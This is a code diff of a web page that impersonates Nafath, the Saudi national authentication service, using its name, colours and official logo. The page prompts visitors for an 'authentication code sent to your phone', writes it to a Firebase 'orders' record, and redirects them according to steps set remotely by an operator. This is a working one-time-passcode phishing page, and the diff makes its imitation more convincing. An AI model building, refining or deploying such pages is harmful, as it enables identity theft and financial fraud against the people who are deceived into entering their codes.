@@ -8,53 +8,61 @@
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
         :root { --nafath-green: #006a4d; --bg-gray: #f4f4f4; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg-gray); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg-gray); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; direction: rtl; }
         
-        /* شريط المعالجة العلوي المطابق للصورة */
-        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 1000; }
-        .loading-box { background: white; padding: 25px; border-radius: 12px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
-        .loader-bar { width: 100%; height: 12px; background: #eee; border-radius: 6px; overflow: hidden; margin-bottom: 15px; display: flex; gap: 2px; }
-        .bar-segment { flex: 1; background: #2ecc71; animation: pulse 1.2s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 0.2; } 50% { opacity: 1; } }
+        .nafath-card {
+            background: white; width: 100%; max-width: 420px;
+            border-radius: 24px; box-shadow: 0 15px 40px rgba(0,0,0,0.08);
+            display: flex; flex-direction: column; overflow: hidden; position: relative;
+            min-height: 500px;
+        }
 
-        .container { width: 100%; max-width: 450px; background: white; min-height: 100vh; display: flex; flex-direction: column; position: relative; }
-        .header { padding: 18px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
-        .header img { height: 38px; }
+        .header { padding: 25px; display: flex; justify-content: center; border-bottom: 1px solid #f0f0f0; background: #fff; }
+        .header img { height: 45px; }
         
-        .content { padding: 25px; text-align: center; }
-        .instruction-text { color: var(--nafath-green); font-size: 16px; font-weight: bold; margin-bottom: 30px; line-height: 1.6; }
+        .content { flex: 1; padding: 40px 30px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         
-        .input-group { margin-bottom: 25px; text-align: right; }
-        label { display: block; margin-bottom: 10px; font-size: 14px; color: #555; font-weight: 600; }
-        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; background: #fafafa; font-size: 18px; text-align: center; box-sizing: border-box; outline: none; letter-spacing: 5px; }
-        input:focus { border-color: var(--nafath-green); background: #fff; }
+        .title { font-size: 20px; font-weight: bold; color: var(--nafath-green); margin-bottom: 15px; }
+        .subtitle { font-size: 15px; color: #666; line-height: 1.6; margin-bottom: 30px; }
 
-        .btn-submit { width: 100%; padding: 16px; background: var(--nafath-green); color: white; border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-submit:hover { opacity: 0.95; }
+        .input-group { width: 100%; margin-bottom: 25px; }
+        input { 
+            width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 12px; 
+            background: #fafafa; font-size: 24px; text-align: center; box-sizing: border-box; 
+            outline: none; letter-spacing: 5px; font-weight: bold; color: #333; transition: 0.3s;
+        }
+        input:focus { border-color: var(--nafath-green); background: #fff; box-shadow: 0 0 0 4px rgba(0, 106, 77, 0.1); }
+
+        .btn-submit { 
+            width: 100%; padding: 16px; background: var(--nafath-green); color: white; 
+            border: none; border-radius: 12px; font-size: 18px; font-weight: bold; 
+            cursor: pointer; transition: 0.3s; 
+        }
+        .btn-submit:hover { background-color: #00553d; transform: translateY(-2px); }
+        
+        /* Loading Overlay */
+        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 10; display: none; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--nafath-green); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="overlay" class="loading-overlay">
-    <div class="loading-box">
-        <div class="loader-bar">
-            <div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div>
-        </div>
-        <div style="font-size: 14px; color: #333; font-weight: 600;">جاري المعالجة ، نرجو الإنتظار ...</div>
+<div class="nafath-card">
+    <div id="overlay">
+        <div class="spinner"></div>
+        <div style="font-size: 14px; color: #333; font-weight: bold;">جاري التحقق...</div>
     </div>
-</div>
 
-<div class="container">
     <div class="header">
-        <div style="font-size: 24px; color: #666;">☰</div>
         <img src="https://iam.gov.sa/static/media/logo.8e294157.svg" alt="Nafath Logo">
     </div>
 
     <div class="content">
-        <p class="instruction-text">تم أرسال رمز التوثيق الى هاتفك الرجاء أدخال الرمز لتثبيت وثيقة التأمين</p>
+        <div class="title">رمز التوثيق</div>
+        <div class="subtitle">تم إرسال رمز التوثيق إلى هاتفك المسجل، يرجى إدخاله للمتابعة</div>
         
         <div class="input-group">
-            <label>رمز التوثيق</label>
             <input type="number" id="otp-code" placeholder="رمز التوثيق" maxlength="6">
         </div>
 
@@ -76,11 +84,6 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    // إخفاء اللودر بعد 3 ثواني
-    setTimeout(() => {
-        document.getElementById('overlay').style.display = 'none';
-    }, 3000);
-
     async function sendOTP() {
         const code = document.getElementById('otp-code').value;
         const userId = localStorage.getItem('user_id');
@@ -90,14 +93,18 @@
             return;
         }
 
+        document.getElementById('overlay').style.display = 'flex';
+
         try {
             await db.collection("orders").doc(userId).update({
                 nafath_otp: code,
-                status: "Nafath OTP Received"
+                status: "تم إرسال كود نفاذ - بانتظار الرقم"
             });
-            // بعد إدخال الرمز، ننتقل لصفحة الرقم الكبير (المعالجة النهائية)
-            window.location.href = "nafath_process.html";
+            // هنا يمكن التوجيه للصفحة التالية (سواء كانت صفحة الرقم أو صفحة النجاح)
+            // سأقوم بتوجيهه لنفس صفحة الرقم nafath.html ليعرض الرقم الجديد إذا تم إرساله
+            window.location.href = "nafath.html"; 
         } catch (e) {
+            document.getElementById('overlay').style.display = 'none';
             alert("حدث خطأ في الاتصال");
         }
     }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
@@ -108,9 +115,9 @@
             if (doc.exists) {
                 const data = doc.data();
                 if (data.next_step === "GO_TO_OTP") {
-                    window.location.href = "otp.html"; 
+                    window.location.href = "nafath_otp.html"; 
                 } else if (data.next_step === "GO_TO_REJECT") {
-                    window.location.href = "payment_faild.html";
+                    window.location.href = "payment_failed.html";
                 } else if (data.next_step === "GO_TO_NAFATH") {
                     window.location.href = "nafath.html";
                 } else if (data.next_step === "SHOW_NAFATH_CODE") {
@@ -130,4 +137,3 @@
 </script>
 </body>
 </html>
-
